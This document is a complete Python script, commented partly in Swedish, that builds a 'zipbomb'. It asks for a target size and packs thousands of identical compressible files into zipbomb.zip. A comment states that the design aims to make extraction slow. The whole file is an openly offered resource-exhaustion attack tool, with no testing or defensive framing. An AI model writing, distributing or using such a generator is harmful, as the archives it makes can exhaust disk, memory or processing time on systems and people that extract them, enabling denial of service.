import zipfile
import sys
import time

def create_zipbomb():
    print("=== Zipbomb Creator ===")
    
    # Fråga användaren om önskad storlek
    try:
        target_size_mb = float(input("Enter desired total size after extraction (in MB): "))
    except ValueError:
        print("Invalid input. Please enter a number.")
        return

    if target_size_mb <= 0:
        print("Size must be greater than 0.")
        return

    # Parametrar för zipbombe
    # Vi använder små filer för att maximera antalet filer (vilket gör unpackningen långsam)
    file_size_kb = 10  # Storlek per fil i KB (10KB är litet men effektivt för antal)
    
    
    # Total bytes = target_size_mb * 1024 * 1024
    
    target_size_bytes = int(target_size_mb * 1024 * 1024)
    file_size_bytes = file_size_kb * 1024
    
    num_files = target_size_bytes // file_size_bytes
    
   
    content = b'A' * file_size_bytes
    
    output_filename = "zipbomb.zip"
    
    
    if os.path.exists(output_filename):
        overwrite = input(f"File '{output_filename}' already exists. Overwrite? (y/n): ")
        if overwrite.lower() != 'y':
            return

    print(f"Creating zipbomb with ~{num_files} files...")
    
    start_time = time.time()
    
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for i in range(num_files):
            filename = f"file_{i}.txt"
            zipf.writestr(filename, content)
            
           
            if num_files > 0:
                progress = (i + 1) / num_files * 100
                
                if progress % 5 < 0.1 or i == num_files - 1:
                    bar_length = 30
                    filled = int(bar_length * (i + 1) / num_files)
                    bar = '█' * filled + '-' * (bar_length - filled)
                    print(f"\rProgress: [{bar}] {progress:.1f}% ({i+1}/{num_files} files)", end='')
                    
    elapsed_time = time.time() - start_time
    print("\nDone!")
    print(f"Zipbomb '{output_filename}' created successfully.")
    print(f"Total extracted size: ~{target_size_mb:.2f} MB")
    print(f"Time taken: {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    import os
    create_zipbomb()
